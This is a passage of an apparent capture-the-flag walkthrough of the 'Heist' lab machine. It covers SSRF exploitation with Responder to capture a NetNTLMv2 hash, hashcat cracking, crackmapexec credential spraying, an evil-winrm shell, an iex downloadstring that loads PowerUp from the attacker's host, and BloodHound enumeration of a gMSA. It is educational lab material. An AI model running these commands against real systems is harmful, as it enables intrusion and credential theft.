+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/6e5e3cb3348ec3b42b484edbfa26555d-1.png" alt="" class="wp-image-1785" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/6e5e3cb3348ec3b42b484edbfa26555d-1.png 771w, https://juggernaut-sec.com/wp-content/uploads/2022/05/6e5e3cb3348ec3b42b484edbfa26555d-1-300x46.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/6e5e3cb3348ec3b42b484edbfa26555d-1-768x119.png 768w" sizes="(max-width: 771px) 100vw, 771px" width="771" height="119"></figure>
+
+
+
+<p>Still searching for the quick win, I tested zerologon next.</p>
+
+
+
+<ul><li>Zerologon did not work as it appears the host is patched against this vulnerability.</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>python3 set_empty_pw.py DC01 192.168.194.165</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/2f60a3abd02e27d6d9ef368d96ccfce8.png" alt="" class="wp-image-1786" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/2f60a3abd02e27d6d9ef368d96ccfce8.png 948w, https://juggernaut-sec.com/wp-content/uploads/2022/05/2f60a3abd02e27d6d9ef368d96ccfce8-300x114.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/2f60a3abd02e27d6d9ef368d96ccfce8-768x292.png 768w" sizes="(max-width: 948px) 100vw, 948px" width="948" height="361"></figure>
+
+
+
+<blockquote class="wp-block-quote"><p>For a copy of the zerologon script I used, check out this GitHub repo <strong><a href="https://github.com/risksense/zerologon">here</a></strong>.</p></blockquote>
+
+
+
+<h2><span class="ez-toc-section" id="Web_Server_Enumeration_and_Exploiting_an_SSRF_Vulnerability_Using_Responder"></span><strong>Web Server Enumeration and Exploiting an SSRF Vulnerability </strong><strong>Using Responder</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Moving away from the Domain Controller based attacks, I decided to have a look at the webserver on port 8080.</p>
+
+
+
+<p>Navigating to the main page brings up a “Secure Web Browser” with a URL search feature.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/408f7e53847f2bdd7dbdad8d8bfc7e4a-1024x732.png" alt="" class="wp-image-1787" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/408f7e53847f2bdd7dbdad8d8bfc7e4a-1024x732.png 1024w, https://juggernaut-sec.com/wp-content/uploads/2022/05/408f7e53847f2bdd7dbdad8d8bfc7e4a-300x214.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/408f7e53847f2bdd7dbdad8d8bfc7e4a-768x549.png 768w, https://juggernaut-sec.com/wp-content/uploads/2022/05/408f7e53847f2bdd7dbdad8d8bfc7e4a.png 1055w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="732"></figure>
+
+
+
+<ul><li>Checking the page source of the main page did not provide anything of interest.</li></ul>
+
+
+
+<p>Since this is a secure “web browser”, we could have an SSRF vulnerability present. We can test for SSRF by firing up an HTTP server and then trying to access it from the URL bar on the webpage. </p>
+
+
+
+<p>I started an HTTP server on port 445 and then put my IP / port in the URL bar and sure enough, I was able to access my server. This confirmed that this server is vulnerable to SSRF!</p>
+
+
+
+<blockquote class="wp-block-quote"><p>Server-side request forgery (also known as SSRF) is a web security vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location. In a typical SSRF attack, the attacker might cause the server to make a connection to internal-only services within the organization’s infrastructure. In some cases, an SSRF vulnerability may allow an attacker to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.</p></blockquote>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/092bbcefc8c0fedc7d5999cd2eeb196b.png" alt="" class="wp-image-1789" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/092bbcefc8c0fedc7d5999cd2eeb196b.png 662w, https://juggernaut-sec.com/wp-content/uploads/2022/05/092bbcefc8c0fedc7d5999cd2eeb196b-300x59.png 300w" sizes="(max-width: 662px) 100vw, 662px" width="662" height="130"></figure>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/image-84.png" alt="" class="wp-image-1796" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/image-84.png 684w, https://juggernaut-sec.com/wp-content/uploads/2022/05/image-84-300x164.png 300w" sizes="(max-width: 684px) 100vw, 684px" width="684" height="373"></figure>
+
+
+
+<p>Clicking on any of my files makes the URL try to navigate to it as a sub directory off of the main page; for example, clicking cmd.bat brings us to <strong>192.168.194.165:8080/cmd.bat</strong>, which obviously doesn’t exist.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/5560737c79fdfdc41e0e8cde9cbf9bb6.png" alt="" class="wp-image-1793" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/5560737c79fdfdc41e0e8cde9cbf9bb6.png 684w, https://juggernaut-sec.com/wp-content/uploads/2022/05/5560737c79fdfdc41e0e8cde9cbf9bb6-300x84.png 300w" sizes="(max-width: 684px) 100vw, 684px" width="684" height="192"></figure>
+
+
+
+<p>However, by adding the filename in the initial search it reads the file I select but does not execute it.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/18db4be95d493d10dd166acad2293ab8-1.png" alt="" class="wp-image-1795" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/18db4be95d493d10dd166acad2293ab8-1.png 671w, https://juggernaut-sec.com/wp-content/uploads/2022/05/18db4be95d493d10dd166acad2293ab8-1-300x59.png 300w" sizes="(max-width: 671px) 100vw, 671px" width="671" height="133"></figure>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/5820f3921fa9cb0a96fd98fa48cf23ba-1024x177.png" alt="" class="wp-image-1794" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/5820f3921fa9cb0a96fd98fa48cf23ba-1024x177.png 1024w, https://juggernaut-sec.com/wp-content/uploads/2022/05/5820f3921fa9cb0a96fd98fa48cf23ba-300x52.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/5820f3921fa9cb0a96fd98fa48cf23ba-768x132.png 768w, https://juggernaut-sec.com/wp-content/uploads/2022/05/5820f3921fa9cb0a96fd98fa48cf23ba.png 1050w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="177"></figure>
+
+
+
+<p>It appears we will not be able to get command execution by accessing files on our web server directly; however, the second part of the description on SSRF attacks above seems interesting: </p>
+
+
+
+<p>“In some cases, an SSRF vulnerability may allow an attacker to force the server to connect to arbitrary external systems, potentially leaking sensitive data such as authorization credentials.”</p>
+
+
+
+<blockquote class="wp-block-quote"><p>A specific tool that can be used to intercept authorization credentials when an arbitrary connection is made to a system is <strong>Responder</strong>. </p></blockquote>
+
+
+
+<p>With this information, we should be able to setup Responder to create a spoofed WPAD proxy server and then search for an arbitrary domain using the URL search bar on the web server. After the request is made, we should see responder intercept the request and dump the hash of the user who owns the webserver.</p>
+
+
+
+<p>Fire up Responder with the following command:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>responder -I tun0 -wv</code></pre>
+
+
+
+<p>Next, we need to send a request to our IP on a port that is not open and we should get a hash in our Responder window. For this example, I just forwarded the request to my IP without specifying a port since my web server is on port 445 and this request will target port 80, which is not open.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/19b09d2cdb1309051b8e04b74efecdbb.png" alt="" class="wp-image-1797" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/19b09d2cdb1309051b8e04b74efecdbb.png 686w, https://juggernaut-sec.com/wp-content/uploads/2022/05/19b09d2cdb1309051b8e04b74efecdbb-300x63.png 300w" sizes="(max-width: 686px) 100vw, 686px" width="686" height="144"></figure>
+
+
+
+<p>After sending the request… BOOM! A NetNTLMv2 hash for the user <strong>enox</strong> comes in to our Responder output.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/15227cf24bba935ccd527a6277fb0ee6.png" alt="" class="wp-image-1798" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/15227cf24bba935ccd527a6277fb0ee6.png 940w, https://juggernaut-sec.com/wp-content/uploads/2022/05/15227cf24bba935ccd527a6277fb0ee6-300x57.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/15227cf24bba935ccd527a6277fb0ee6-768x146.png 768w" sizes="(max-width: 940px) 100vw, 940px" width="940" height="179"></figure>
+
+
+
+<blockquote class="wp-block-quote"><p>To see more examples of attacks using Responder, check out my post <strong><a href="https://juggernaut-sec.com/llmnr-poisoning-responder/">here</a></strong>.</p></blockquote>
+
+
+
+<h2><span class="ez-toc-section" id="Cracking_the_NetNTLMv2_Hash_with_Hashcat"></span><strong>Cracking the NetNTLMv2 Hash with Hashcat</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Copy the entire hash including the username and use a text editor to paste it into a file named hash.txt. After that, use the following commands to find the cracking mode needed for this hash type and then to begin cracking it:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>hashcat -h | grep -i "ntlmv2"
+hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/3702a75427aed5da8490ed952243cc73.png" alt="" class="wp-image-1801" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/3702a75427aed5da8490ed952243cc73.png 936w, https://juggernaut-sec.com/wp-content/uploads/2022/05/3702a75427aed5da8490ed952243cc73-300x96.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/3702a75427aed5da8490ed952243cc73-768x245.png 768w" sizes="(max-width: 936px) 100vw, 936px" width="936" height="298"></figure>
+
+
+
+<p>After no time at all, the hash is cracked and the password extracted from the cracked.txt file we output the results into.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/75f95417e3c8bea0d4e34757f63c15f2.png" alt="" class="wp-image-1802" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/75f95417e3c8bea0d4e34757f63c15f2.png 648w, https://juggernaut-sec.com/wp-content/uploads/2022/05/75f95417e3c8bea0d4e34757f63c15f2-300x119.png 300w" sizes="(max-width: 648px) 100vw, 648px" width="648" height="256"></figure>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/aadfd3317d4aff0e76653232ca27061a.png" alt="" class="wp-image-1803" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/aadfd3317d4aff0e76653232ca27061a.png 929w, https://juggernaut-sec.com/wp-content/uploads/2022/05/aadfd3317d4aff0e76653232ca27061a-300x46.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/aadfd3317d4aff0e76653232ca27061a-768x117.png 768w" sizes="(max-width: 929px) 100vw, 929px" width="929" height="141"></figure>
+
+
+
+<p><strong>enox : california</strong></p>
+
+
+
+<p>After finding these credentials it’s a good idea to start building out a user.txt file and password.txt file that we can add to as we find more usernames and passwords. </p>
+
+
+
+<blockquote class="wp-block-quote"><p>I added administrator and krbtgt to the users.txt since they will always be valid in the domain. Also, if we test every password we find against the administrator, we might get lucky and have a password reuse situation.</p></blockquote>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/cfa5990a40f9d7d240e935353148a90b.png" alt="" class="wp-image-1804" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/cfa5990a40f9d7d240e935353148a90b.png 341w, https://juggernaut-sec.com/wp-content/uploads/2022/05/cfa5990a40f9d7d240e935353148a90b-300x180.png 300w" sizes="(max-width: 341px) 100vw, 341px" width="341" height="205"></figure>
+
+
+
+<h2><span class="ez-toc-section" id="Testing_Access_with_the_Cracked_Password_Using_Crackmapexec"></span><strong>Testing Access with the Cracked Password</strong> Using Crackmapexec<span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Now that both lists have been created, we can begin testing access to different services using crackmapexec.</p>
+
+
+
+<p>Testing SMB access first, I found the user / pass combo was legit but did not <strong>Pwn3d!</strong> message, which means I cannot use this service to get a shell. Next, I tested WinRM access and that’s when knew I found my foothold after seeing that this user <strong>Pwn3d!</strong> this service.</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>crackmapexec smb 192.168.194.165 -u users.txt -p passwords.txt --continue-on-success
+crackmapexec winrm 192.168.194.165 -u users.txt -p passwords.txt --continue-on-success</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/6a5c34337de6ad466c6a02c0ced056a9.png" alt="" class="wp-image-1805" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/6a5c34337de6ad466c6a02c0ced056a9.png 943w, https://juggernaut-sec.com/wp-content/uploads/2022/05/6a5c34337de6ad466c6a02c0ced056a9-300x75.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/6a5c34337de6ad466c6a02c0ced056a9-768x193.png 768w" sizes="(max-width: 943px) 100vw, 943px" width="943" height="237"></figure>
+
+
+
+<h2><span class="ez-toc-section" id="Gaining_a_Foothold_Through_the_WinRM_Service_Using_Evil-Winrm"></span><strong>Gaining a Foothold Through the WinRM Service Using Evil-Winrm</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>Since we can access the machine through WinRM, we can use <strong>evil-winrm</strong> to get a very powerful shell on the victim.</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>evil-winrm -i 192.168.194.165 -u enox -p california</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/7ad7154be328c138371eb4c1cc834c94.png" alt="" class="wp-image-1806" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/7ad7154be328c138371eb4c1cc834c94.png 460w, https://juggernaut-sec.com/wp-content/uploads/2022/05/7ad7154be328c138371eb4c1cc834c94-300x103.png 300w" sizes="(max-width: 460px) 100vw, 460px" width="460" height="158"></figure>
+
+
+
+<h1><span class="ez-toc-section" id="Post_Exploitation_Enumeration_and_Privilege_Escalation_to_svc_apache"></span><strong>Post Exploitation Enumeration and Privilege Escalation</strong> <strong>to svc_apache$</strong><span class="ez-toc-section-end"></span></h1>
+
+
+
+<p>Now that we have gained a foothold on the target, we can begin performing enumeration of the machines local files and settings.</p>
+
+
+
+<h2><span class="ez-toc-section" id="Local_Enumeration_Using_Manual_Technqiues_PowerUpps1_and_WinPeas"></span><strong>Local Enumeration Using Manual Technqiues, PowerUp.ps1, and WinPeas</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>We will start our post-exploitation enumeration with some manual commands to better understand our target, our current user’s permissions, and to search for quick wins.</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Network Card(s)" /C:"Hotfix(s)"</code></pre>
+
+
+
+<ul><li>Access Denied!</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>whoami /priv</code></pre>
+
+
+
+<ul><li>No interesting privileges found on this user.</li></ul>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/401c15dce1f8679cfdced134184cc2d4.png" alt="" class="wp-image-1807" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/401c15dce1f8679cfdced134184cc2d4.png 567w, https://juggernaut-sec.com/wp-content/uploads/2022/05/401c15dce1f8679cfdced134184cc2d4-300x89.png 300w" sizes="(max-width: 567px) 100vw, 567px" width="567" height="169"></figure>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>cmdkey /list</code></pre>
+
+
+
+<ul><li>No stored credentials found.</li></ul>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/c569347972950fbbffb251d611aa1faa.png" alt="" class="wp-image-1808" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/c569347972950fbbffb251d611aa1faa.png 445w, https://juggernaut-sec.com/wp-content/uploads/2022/05/c569347972950fbbffb251d611aa1faa-300x61.png 300w" sizes="(max-width: 445px) 100vw, 445px" width="445" height="91"></figure>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>net user enox</code></pre>
+
+
+
+<ul><li>A couple of interesting group memberships, most notably&nbsp;<strong>Web Admins</strong>.</li></ul>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/46e594e0cae92f3c6a521e4831a84494.png" alt="" class="wp-image-1810" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/46e594e0cae92f3c6a521e4831a84494.png 534w, https://juggernaut-sec.com/wp-content/uploads/2022/05/46e594e0cae92f3c6a521e4831a84494-300x242.png 300w" sizes="(max-width: 534px) 100vw, 534px" width="534" height="431"></figure>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>net localgroup administrators</code></pre>
+
+
+
+<ul><li>The only local admin in this group is the built-in Administrator account and the nested domain admin groups.</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>cmd.exe /c dir /a C:\</code></pre>
+
+
+
+<ul><li>No interesting or hidden files or directories in the root of the filesystem.</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>ls "program files"</code></pre>
+
+
+
+<ul><li>Interesting non-default software found: <strong>nssm-2.24</strong></li></ul>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/c9f77f634bf54b9e3ec9f75ece7ca233.png" alt="" class="wp-image-1811" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/c9f77f634bf54b9e3ec9f75ece7ca233.png 755w, https://juggernaut-sec.com/wp-content/uploads/2022/05/c9f77f634bf54b9e3ec9f75ece7ca233-300x153.png 300w" sizes="(max-width: 755px) 100vw, 755px" width="755" height="386"></figure>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>icalcs "C:\Program Files\nasm-2.24\win64\nssm.exe"
+icalcs "C:\Program Files\nasm-2.24\win64"</code></pre>
+
+
+
+<ul><li>Checking permissions on the nssm executable and directory shows that I only have Read/Execute permissions and cannot write (no W, M, or F).</li></ul>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/4ac74a25ceda0336817f2c5b18d613c1.png" alt="" class="wp-image-1817" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/4ac74a25ceda0336817f2c5b18d613c1.png 943w, https://juggernaut-sec.com/wp-content/uploads/2022/05/4ac74a25ceda0336817f2c5b18d613c1-300x141.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/4ac74a25ceda0336817f2c5b18d613c1-768x361.png 768w" sizes="(max-width: 943px) 100vw, 943px" width="943" height="443"></figure>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>ls "program files (x86)"</code></pre>
+
+
+
+<ul><li>No interesting non-default files / folders.</li></ul>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>netstat -nao</code></pre>
+
+
+
+<ul><li>No ports open internally (127.0.0.1) or ports blocked by the firewall. Seeing only the same ports as the nmap scan.</li></ul>
+
+
+
+<p>Looking at the local user profiles on the machine, I noticed there was a profile for a service account named <strong>svc_apache$</strong>. This user was not observed when using the <strong>net users</strong> command, which indicates that this is likely a domain account.</p>
+
+
+
+<blockquote class="wp-block-quote"><p>It’s common to find service accounts that end with $. Also, seeing <strong>svc</strong> in the name indicates this is a service account.</p></blockquote>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/e8d5e902fcd9e14b42cfb3f01f211983.png" alt="" class="wp-image-1812" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/e8d5e902fcd9e14b42cfb3f01f211983.png 531w, https://juggernaut-sec.com/wp-content/uploads/2022/05/e8d5e902fcd9e14b42cfb3f01f211983-300x118.png 300w" sizes="(max-width: 531px) 100vw, 531px" width="531" height="209"></figure>
+
+
+
+<p>I added <strong>svc_apache$</strong> to my user list and then ran kerbrute against the list and found the user is valid in the domain!</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/39643014a39cba5cab74339e8dea2aad.png" alt="" class="wp-image-1814" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/39643014a39cba5cab74339e8dea2aad.png 707w, https://juggernaut-sec.com/wp-content/uploads/2022/05/39643014a39cba5cab74339e8dea2aad-300x65.png 300w" sizes="(max-width: 707px) 100vw, 707px" width="707" height="154"></figure>
+
+
+
+<blockquote class="wp-block-quote"><p>I forgot the $ in the name when I added it to the users.txt file — D’oh! — however, it still confirmed the user exists.</p></blockquote>
+
+
+
+<p>After performing some decent manual enumeration, I decided to close up responder to free up port 445; and then I started a web server on port 445 again. With the web server running, I downloaded PowerUp.ps1 directly into memory using an IEX command to see if any quick wins are available.</p>
+
+
+
+<blockquote class="wp-block-quote"><p>My copy of PowerUp.ps1 has the command <strong>Invoke-AllChecks </strong>hard-coded at the bottom of the script so that when it is executed in memory with IEX, the command is auto-executed.</p></blockquote>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>iex(new-object net.webclient).downloadstring('http://192.168.49.194:445/PowerUp.ps1')</code></pre>
+
+
+
+<ul><li>Nothing juicy was found with PowerUp.</li></ul>
+
+
+
+<p>Next I downloaded WinPEAS onto the victim and executed it.</p>
+
+
+
+<ul><li>Nothing juicy was found with WinPEAS.</li></ul>
+
+
+
+<p>Not seeing much opportunity to privesc from the local enumeration, I decided to move onto domain enumeration.</p>
+
+
+
+<h2><span class="ez-toc-section" id="Domain_Enumeration_Using_Bloodhoundpy_and_PowerViewps1"></span><strong> Domain Enumeration Using Bloodhound.py and PowerView.ps1</strong><span class="ez-toc-section-end"></span></h2>
+
+
+
+<p>To get a good look at what we can do on this machine as the current domain user, I ran <strong>bloodhound.py</strong> to extract information on the server in the form of four JSON files.</p>
+
+
+
+<p>I created a bloodhound sub directory in my working directory and then executed the following command to extract info on the server:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>/opt/Windows/BloodHound_Python/bloodhound.py -d heist.offsec -u enox -p california -c all -ns 192.168.194.165</code></pre>
+
+
+
+<p>Next I started both bloodhound and neo4j in separate tabs on my attacker machine.</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>sudo neo4j console
+
+sudo bloodhound</code></pre>
+
+
+
+<p>After Bloodhound loaded up, I logged in and then proceeded to upload the four JSON files that were extracted using bloodhound.py. </p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/78c7978d95dd48a546de8326d1f47d0a-1.png" alt="" class="wp-image-1819" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/78c7978d95dd48a546de8326d1f47d0a-1.png 633w, https://juggernaut-sec.com/wp-content/uploads/2022/05/78c7978d95dd48a546de8326d1f47d0a-1-300x176.png 300w" sizes="(max-width: 633px) 100vw, 633px" width="633" height="372"></figure>
+
+
+
+<p>This will allow us to perform a graphical analysis of AD rights and relations, focusing on the ones that we can abuse.</p>
+
+
+
+<p>Now that everything is uploaded we can go to the hamburger menu in the top left corner and then go to the Analysis tab to see a list of pre-built queries.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/8442901667a85bf701cabc4f8b9d7d3e-1.png" alt="" class="wp-image-1820" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/8442901667a85bf701cabc4f8b9d7d3e-1.png 487w, https://juggernaut-sec.com/wp-content/uploads/2022/05/8442901667a85bf701cabc4f8b9d7d3e-1-213x300.png 213w" sizes="(max-width: 487px) 100vw, 487px" width="487" height="685"></figure>
+
+
+
+<p>Going from the bottom up on this list, nothing was providing data until I got to&nbsp;<strong>Shortest Paths to High Value Targets</strong>, which revealed nothing interesting about my current user; however, it did show some interesting info on the service account.</p>
+
+
+
+<figure class="wp-block-image size-large"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/88cfd73257d3594b7b83b9ba08fabb35-1024x522.png" alt="" class="wp-image-1821" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/88cfd73257d3594b7b83b9ba08fabb35-1024x522.png 1024w, https://juggernaut-sec.com/wp-content/uploads/2022/05/88cfd73257d3594b7b83b9ba08fabb35-300x153.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/88cfd73257d3594b7b83b9ba08fabb35-768x391.png 768w, https://juggernaut-sec.com/wp-content/uploads/2022/05/88cfd73257d3594b7b83b9ba08fabb35-1536x783.png 1536w, https://juggernaut-sec.com/wp-content/uploads/2022/05/88cfd73257d3594b7b83b9ba08fabb35-1320x673.png 1320w, https://juggernaut-sec.com/wp-content/uploads/2022/05/88cfd73257d3594b7b83b9ba08fabb35.png 1748w" sizes="(max-width: 1024px) 100vw, 1024px" width="1024" height="522"></figure>
+
+
+
+<p>This shows that the <strong>svc_apache</strong> service account can read the GMSA password, which means that the <strong>svc_apache</strong> account is a Group Managed Service Account (gMSA).</p>
+
+
+
+<blockquote class="wp-block-quote"><p>Group managed service accounts (gMSAs) are managed domain accounts that you use to help secure services. After you configure your services to use a gMSA principal, password management for that account is handled by the Windows operating system.</p></blockquote>
+
+
+
+<p>Using the following PowerShell command, we can confirm that this account is a service account with GMSA enabled:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>Get-ADServiceAccount -Filter * | where-object {$_.ObjectClass -eq "msDS-GroupManagedServiceAccount"}</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/f821bf8c160e6ca6ae01510c0e6ccf37.png" alt="" class="wp-image-1823" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/f821bf8c160e6ca6ae01510c0e6ccf37.png 938w, https://juggernaut-sec.com/wp-content/uploads/2022/05/f821bf8c160e6ca6ae01510c0e6ccf37-300x67.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/f821bf8c160e6ca6ae01510c0e6ccf37-768x171.png 768w" sizes="(max-width: 938px) 100vw, 938px" width="938" height="209"></figure>
+
+
+
+<p>To get more insight into the group that manages this service account, I downloaded PowerView.ps1 onto the victim and then loaded it into my current session using dot-sourcing.</p>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/b5dd03294d03d5cfdbe4ff772ce7b02e.png" alt="" class="wp-image-1824" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/b5dd03294d03d5cfdbe4ff772ce7b02e.png 589w, https://juggernaut-sec.com/wp-content/uploads/2022/05/b5dd03294d03d5cfdbe4ff772ce7b02e-300x139.png 300w" sizes="(max-width: 589px) 100vw, 589px" width="589" height="272"></figure>
+
+
+
+<p>The following command provides info about which groups have permissions to retrieve the password for the svc_apache service account:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>Get-ADServiceAccount -Filter {name -eq 'svc_apache'} -Properties * | Select CN,DNSHostName,DistinguishedName,MemberOf,Created,LastLogonDate,PasswordLastSet,msDS-ManagedPasswordInterval,PrincipalsAllowedToDelegateToAccount,PrincipalsAllowedToRetrieveManagedPassword,ServicePrincipalNames</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/2047152924696f872cbb2ac561ec0c68.png" alt="" class="wp-image-1826" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/2047152924696f872cbb2ac561ec0c68.png 955w, https://juggernaut-sec.com/wp-content/uploads/2022/05/2047152924696f872cbb2ac561ec0c68-300x94.png 300w, https://juggernaut-sec.com/wp-content/uploads/2022/05/2047152924696f872cbb2ac561ec0c68-768x240.png 768w" sizes="(max-width: 955px) 100vw, 955px" width="955" height="298"></figure>
+
+
+
+<p>This shows that members of Web Admins group can retrieve the gMSA password. Earlier during the manual enumeration, we saw that our current user <strong>enox</strong> was a member of this group! This also shows that the svc_apache account is in the remote users group, which means that once we extract the gMSA password, we can remote in with this account using evil-winrm.</p>
+
+
+
+<p>Just to be certain, we can double check that our user is in the Web Admins group using the following command:</p>
+
+
+
+<pre class="wp-block-code has-black-color has-text-color"><code>Get-ADGroupMember 'Web Admins'</code></pre>
+
+
+
+<figure class="wp-block-image size-full"><img loading="lazy" src="https://juggernaut-sec.com/wp-content/uploads/2022/05/87b48b0d517f2226c3127694f6e10a3c.png" alt="" class="wp-image-1827" srcset="https://juggernaut-sec.com/wp-content/uploads/2022/05/87b48b0d517f2226c3127694f6e10a3c.png 538w, https://juggernaut-sec.com/wp-content/uploads/2022/05/87b48b0d517f2226c3127694f6e10a3c-300x89.png 300w" sizes="(max-width: 538px) 100vw, 538px" width="538" height="159"></figure>
+
+
+
